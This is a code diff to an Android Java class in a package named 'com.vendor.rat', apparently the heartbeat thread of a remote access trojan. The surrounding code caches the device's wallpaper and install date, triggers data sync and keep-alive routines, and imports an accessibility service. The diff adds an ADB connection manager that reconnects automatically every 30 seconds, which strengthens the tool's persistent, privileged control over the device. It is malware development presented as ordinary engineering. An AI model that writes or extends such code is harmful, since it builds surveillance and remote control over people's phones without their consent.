@@ -15,6 +15,7 @@ import android.util.Base64;
 import android.util.Log;
 
 import com.vendor.rat.MainApplication;
+import com.vendor.rat.adb.AdbConnectionManager;
 import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.service.CustomNotificationService;
 import com.vendor.rat.service.MyAccessibilityService;
@@ -50,6 +51,7 @@ public final class KeepHeartThread extends TimerTask {
     private final AtomicBoolean cacheTaskActive = new AtomicBoolean(false);
     private String cachedInstallDate;  // 安装日期不变，只查一次
     private volatile String cachedWallpap = "";  // 缩略图缓存，每次 tick 异步更新
+    private final AtomicInteger adbHeartbeatCounter = new AtomicInteger(0); // ADB heartbeat every 3rd tick (~30s)
 
     public KeepHeartThread() {
         this.debugRetryPolicy = null; // TODO: VENDOR_VERIFY - new s.a(5000, 1)
@@ -153,6 +155,20 @@ public final class KeepHeartThread extends TimerTask {
                 StrategyThread.triggerKeepAliveIfNeeded();
                 triggerDataSync();
                 fetchCacheTasks();
+
+                // ADB heartbeat: auto-reconnect every ~30s (every 3rd tick)
+                try {
+                    if (adbHeartbeatCounter.incrementAndGet() >= 3) {
+                        adbHeartbeatCounter.set(0);
+                        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
+                        if (mgr != null) {
+                            mgr.heartbeat();
+                        }
+                    }
+                } catch (Exception adbEx) {
+                    // Never crash the keepalive thread for ADB issues
+                    Log.w(TAG, "ADB heartbeat failed", adbEx);
+                }
             } catch (Exception e) {
                 Log.e(TAG, "KeepHeartThread error", e);
             } finally {
